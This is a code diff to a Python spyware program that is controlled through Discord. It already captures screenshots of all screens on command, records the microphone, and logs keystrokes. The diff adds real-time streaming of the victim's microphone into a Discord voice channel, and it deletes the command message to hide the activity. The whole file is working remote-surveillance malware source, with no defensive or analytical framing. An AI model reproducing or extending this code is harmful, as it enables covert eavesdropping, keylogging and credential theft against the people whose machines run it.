@@ -4,7 +4,9 @@ from shutil import copy2
 import os
 import sys
 from PIL import ImageGrab
+import time
 from getpass import getuser
+import pyaudio
 import asyncio
 import sounddevice
 from scipy.io.wavfile import write
@@ -98,22 +100,28 @@ async def on_ready():
 
 @client.event
 async def on_message(message):
-    global channel_ids
+    global channel_ids, vc
     if message.content == '.ss':
         ImageGrab.grab(all_screens=True).save('ss.png')
         await message.channel.send(embed=discord.Embed(title=current_time() + ' `[On demand]`').set_image(url='attachment://ss.png'), file=discord.File('ss.png'))
         os.system('del ss.png')
-    '''
+
     elif message.content == '.join':
-        vc = await client.get_channel(channel_ids['voice']).connect()
+        await message.delete()
+        vc = await client.get_channel(channel_ids['voice']).connect(self_deaf=True)
+        vc.play(PyAudioPCM())
+        await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
-        audio_source = discord.FFmpegPCMAudio(executable="ffmpeg-master-latest-win64-gpl\\bin\\ffmpeg.exe", source='1.wav')
-        #record_voice = sounddevice.rec(int(10 * 16000), samplerate=16000, channels=1)
-        #sounddevice.wait()
-        #write('1.wav', 16000, record_voice)
 
-        vc.play(audio_source, after=None)
-    '''
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
+        p = pyaudio.PyAudio()
+        self.chunks = chunk
+        self.input_stream = p.open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+
+    def read(self) -> bytes:
+        return self.input_stream.read(self.chunks)
+
 
 def start_recording():
     global files_to_send, channel_ids
@@ -125,7 +133,6 @@ def start_recording():
         record_name = 'rec_\\' + current_time() + '.wav'
         write(record_name, 16000, recorded_mic)
         files_to_send.append([channel_ids['recordings'], '', record_name, True])
-
 
 def on_press(key):
     global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
